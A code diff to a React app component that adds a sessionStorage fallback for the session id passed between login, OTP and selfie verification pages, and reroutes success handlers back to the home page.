@@ -19,10 +19,18 @@ function currentPath() {
   return window.location.pathname.replace(/\/+$/, '') || '/'
 }
 
+function getSavedSessionId(): string {
+  try {
+    return sessionStorage.getItem('sip_sessionId') || ''
+  } catch {
+    return ''
+  }
+}
+
 export default function App() {
   const [path, setPath] = useState(currentPath)
   const [modal, setModal] = useState<ModalMode>(null)
-  const [currentSessionId, setCurrentSessionId] = useState('')
+  const [currentSessionId, setCurrentSessionId] = useState(getSavedSessionId)
   const [otpState, setOtpState] = useState<{ sessionId: string; mode: 'dinamica' | 'sms' } | null>(null)
   const [showSelfie, setShowSelfie] = useState(false)
   const [loginError, setLoginError] = useState('')
@@ -45,7 +53,7 @@ export default function App() {
     if (showSelfie) {
       return (
         <SelfiePage
-          sessionId={currentSessionId}
+          sessionId={currentSessionId || getSavedSessionId()}
           onHome={() => {
             setShowSelfie(false)
             setOtpState(null)
@@ -53,7 +61,7 @@ export default function App() {
           }}
           onOtpRequired={(mode) => {
             setShowSelfie(false)
-            setOtpState({ sessionId: currentSessionId, mode })
+            setOtpState({ sessionId: currentSessionId || getSavedSessionId(), mode })
           }}
           onErrorLogin={() => {
             setShowSelfie(false)
@@ -67,16 +75,16 @@ export default function App() {
     if (otpState) {
       return (
         <OtpPage
-          sessionId={otpState.sessionId}
+          sessionId={otpState.sessionId || currentSessionId || getSavedSessionId()}
           initialMode={otpState.mode}
           onHome={() => {
             setOtpState(null)
             go('/')
           }}
           onSuccess={() => {
-            setCurrentSessionId(otpState.sessionId)
-            setShowSelfie(true)
+            setShowSelfie(false)
             setOtpState(null)
+            go('/')
           }}
           onSelfieRequired={() => {
             setCurrentSessionId(otpState.sessionId)
@@ -106,7 +114,9 @@ export default function App() {
           setShowSelfie(true)
         }}
         onSuccess={() => {
-          setShowSelfie(true)
+          setShowSelfie(false)
+          setOtpState(null)
+          go('/')
         }}
       />
     )
@@ -133,7 +143,13 @@ export default function App() {
         <Related />
       </main>
       <Footer />
-      {modal ? <ApplyModal mode={modal} onClose={() => setModal(null)} /> : null}
+
+      {modal !== null ? (
+        <ApplyModal
+          mode={modal === 'card' ? 'card' : 'cts'}
+          onClose={() => setModal(null)}
+        />
+      ) : null}
     </>
   )
 }
